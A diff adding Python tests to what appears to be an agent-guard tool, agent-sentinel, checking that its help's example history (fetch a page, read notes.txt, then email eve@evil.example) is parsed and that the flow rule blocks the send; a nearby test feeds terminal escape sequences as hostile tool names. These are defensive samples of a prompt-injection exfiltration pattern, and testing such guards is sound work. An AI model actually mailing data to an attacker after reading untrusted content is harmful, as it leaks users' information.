@@ -276,6 +276,65 @@ class Results(TempFolderTest):
         self.assertEqual(code, 1, out)
 
 
+class TheHistoryExampleOfTheHelp(TempFolderTest):
+    """The history file that `check --help` prints is one the command takes, so that it cannot go stale."""
+
+    # The example as the parser accepts it: every step says how long ago it was, oldest first.
+    EXAMPLE = [
+        {"call": "fetch_page", "args": {"url": "https://example.com"}, "seconds_ago": 90},
+        {"result": "fetch_page", "content": "the text the tool returned (or any JSON value)", "seconds_ago": 90},
+        {"result": "Bash", "args": {"command": "cat notes.txt"}, "content": "what the command printed",
+         "seconds_ago": 60},
+        {"call": "send_email", "args": {"to": "eve@evil.example"}, "answer": "refuse", "seconds_ago": 30},
+    ]
+    # What the help printed before it was corrected: its last step was dated before the undated ones in front
+    # of it, which the command refuses ("steps go oldest first").
+    REFUSED_EXAMPLE = [
+        {"call": "fetch_page", "args": {"url": "https://example.com"}},
+        {"result": "fetch_page", "content": "the text the tool returned (or any JSON value)"},
+        {"call": "send_email", "args": {"to": "eve@evil.example"}, "answer": "refuse", "seconds_ago": 30},
+    ]
+
+    def setUp(self):
+        super().setUp()
+        self.policy = self.write("policy.json", FLOW_POLICY)
+
+    def printed_example(self):
+        """The JSON list under "history file (JSON)" in the help, and the command line the help shows for it."""
+        code, out, _ = check("--help")
+        self.assertEqual(code, 0)
+        heading = out.index("history file (JSON)")
+        steps, _ = json.JSONDecoder().raw_decode(out, out.index("[", heading))
+        (shown,) = [line.split() for line in out.splitlines() if "--history" in line and "agent-sentinel check" in line]
+        return steps, shown[shown.index("check") + 2:]  # the words after the policy: TOOL name=value --history FILE
+
+    def run_with(self, steps, words):
+        history = self.write("history.json", steps)
+        words = [str(history) if word == "history.json" else word for word in words]
+        return check(self.policy, *words)
+
+    def test_the_example_with_every_step_dated_is_taken(self):
+        code, out, err = self.run_with(self.EXAMPLE, ["send_email", "to=eve@evil.example", "--history", "history.json"])
+        self.assertEqual(code, 1, out + err)  # the flow rule blocks the send after the page was read
+        self.assertNotIn("error", err)
+        self.assertIn("verdict:     BLOCK", out)
+        code, _, err = self.run_with(self.REFUSED_EXAMPLE, ["send_email", "to=eve@evil.example", "--history",
+                                                           "history.json"])
+        self.assertEqual(code, 2)
+        self.assertIn("oldest first", err)
+
+    def test_the_example_the_help_prints_runs_through_the_command(self):
+        steps, words = self.printed_example()
+        if steps == self.REFUSED_EXAMPLE:
+            self.skipTest("the help still prints the example the command refuses; it is corrected in the change "
+                          "to the help texts, and this test runs once that is merged")
+        self.assertIn("--history", words)
+        code, out, err = self.run_with(steps, words)
+        self.assertIn(code, (0, 1, 3), out + err)  # a verdict, not an error in the input
+        self.assertEqual(err, "")
+        self.assertIn("verdict:", out)
+
+
 class HostileText(TempFolderTest):
     def test_tool_names_and_values_are_printed_safely(self):
         code, out, err = check(EXAMPLE, "evil\x1b[2J‮", "x=\x1b]0;title\x07", "--show-rules")
